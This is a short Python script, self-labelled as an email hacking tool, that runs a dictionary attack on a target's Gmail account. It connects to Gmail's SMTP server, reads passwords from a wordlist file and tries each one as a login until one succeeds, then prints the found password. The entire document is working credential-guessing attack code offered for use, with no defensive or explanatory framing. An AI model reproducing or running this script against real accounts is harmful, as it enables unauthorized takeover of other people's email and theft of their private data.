import smtplib, sys, os

print("xxxxx HACK EMAIL BY ZEFYRINUSX xxxxx\n* There are very few opportunities to success hack.\n")

print("[ x ] Connecting smtp...")
smtpx = smtplib.SMTP("smtp.gmail.com", 587)
smtpx.ehlo()
smtpx.starttls()

args = len(sys.argv)

correct = 0

if args == 2:
    user = sys.argv[1]
    files = "password.txt"
elif args == 3:
    user = sys.argv[1]
    files = sys.argv[2]
elif args > 3:
    print("\nUsage: %s (taget mail) (file) or %s" % (sys.argv[0], sys.argv[0]))
    os._exit(0)
else: 
    user = input("[ x ] Target mail: ")
    files = "password.txt"

try:	
    wordlist = open(files,"r",encoding="utf8")
    print("\n[ x ] Hacking " + user + "...")
    for password in wordlist:
        try:
            smtpx.login(user,password)
            print("[ x ] Correct password: " + str(password))
            correct = 1
            break
        except:
            pass
except:
    correct = 2
    print("[ x ] Can't open " + files)

if correct == 0:
    print("[ x ] Don't have correct password.")